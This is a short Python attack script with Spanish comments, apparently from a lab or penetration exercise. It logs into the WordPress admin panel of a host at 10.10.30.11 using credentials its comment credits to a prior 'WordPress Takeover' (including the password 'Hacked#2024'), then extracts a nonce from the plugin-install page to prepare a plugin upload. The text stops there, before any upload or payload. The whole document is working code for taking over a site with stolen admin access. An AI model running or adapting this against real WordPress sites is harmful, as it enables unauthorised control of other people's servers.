import urllib.request, urllib.parse, http.cookiejar, re

base = 'http://10.10.30.11/wordpress/'
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

# Obtener nonce de login
resp = opener.open(base + 'wp-login.php').read().decode()
print("Login page OK")

# Login con credenciales del WordPress Takeover
data = urllib.parse.urlencode({
    'log': 'admin',
    'pwd': 'Hacked#2024',
    'wp-submit': 'Log In',
    'redirect_to': '/wordpress/wp-admin/',
    'testcookie': '1'
}).encode()

resp2 = opener.open(base + 'wp-login.php', data).read().decode()
logged = 'wp-admin' in resp2 or 'Dashboard' in resp2
print(f'Login WordPress admin: {"SUCCESS" if logged else "FAILED"}')

# Obtener nonce para subir plugin
resp3 = opener.open(base + 'wp-admin/plugin-install.php').read().decode()
nonce = re.search(r'_wpnonce["\s:=]+([a-f0-9]+)', resp3)
nonce = nonce.group(1) if nonce else ''
print(f'Nonce: {nonce}')